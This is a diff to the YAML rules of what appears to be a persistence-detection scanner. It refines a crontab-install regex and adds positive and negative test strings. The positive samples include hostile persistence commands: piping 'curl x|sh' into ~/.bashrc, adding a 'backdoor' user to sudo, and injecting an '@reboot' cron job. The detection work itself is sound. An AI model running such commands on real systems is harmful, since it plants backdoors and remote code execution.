@@ -419,7 +419,11 @@ rules:
       kind: regex
       patterns:
         - '>>\s*[^\n]*\.(?:bashrc|bash_profile|zshrc|profile)\b'
-        - '\bcrontab\s+-|/etc/cron\.[a-z]+/'
+        # `crontab -` installs what it reads, `crontab -u user <file>` a file. `-l` lists, `-e` opens an editor for a
+        # person and `-r` removes: none plants anything, and incident-response scripts save `crontab
+        # -l` as evidence (review 98, real skills). A pipeline that lists, edits and reinstalls still
+        # ends in `crontab -`.
+        - '\bcrontab\s+(?:-u\s+\S+\s+)?-(?![lreu]\b)|\bcrontab\s+-u\s+\S+\s+(?!-)\S|/etc/cron\.[a-z]+/'
         # A unit path that is being WRITTEN. The bare path was listed and an
         # uninstaller names exactly the same paths as the installer: `pi-hole`'s
         # `uninstall.sh` runs `rm -f /etc/systemd/system/pihole-FTL.service` and then
@@ -464,6 +468,7 @@ rules:
         - "usermod -aG sudo backdoor"
         - "echo 'curl x|sh' >> ~/.bashrc"
         - "crontab -l | { cat; echo '@reboot /tmp/x'; } | crontab -"
+        - "crontab -u root -"
         - "cp agent.service /etc/systemd/system/agent.service"
         - "systemctl enable agent.service"
       negative:
@@ -473,6 +478,8 @@ rules:
         - "rm -rf /etc/systemd/system/pihole-FTL.service.d"
         - "net user flask"
         - "id -u someone"
+        - "crontab -l > \"$EVIDENCE_DIR/crontab_current.txt\""
+        - "crontab -u alice -l"
         - "echo '--- User LaunchAgents ---'"
         - "printf 'inspecting /etc/systemd/system contents\\n'"
 
